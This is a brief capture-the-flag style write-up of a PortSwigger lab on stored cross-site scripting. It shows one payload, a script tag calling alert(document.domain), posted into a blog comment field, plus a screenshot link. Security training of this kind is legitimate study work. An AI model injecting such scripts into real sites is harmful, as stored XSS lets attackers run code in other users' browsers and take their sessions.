# Stored XSS into HTML context with nothing encoded

**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal - 

Exploit the stored XSS vulnerability to call the alert function.

### Analysyis/Exploitation

**inject a JavaScript function called **`alert()`** in post comment section:**

`<script>alert(document.domain)</script>`

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/90072dedd134_001.png)
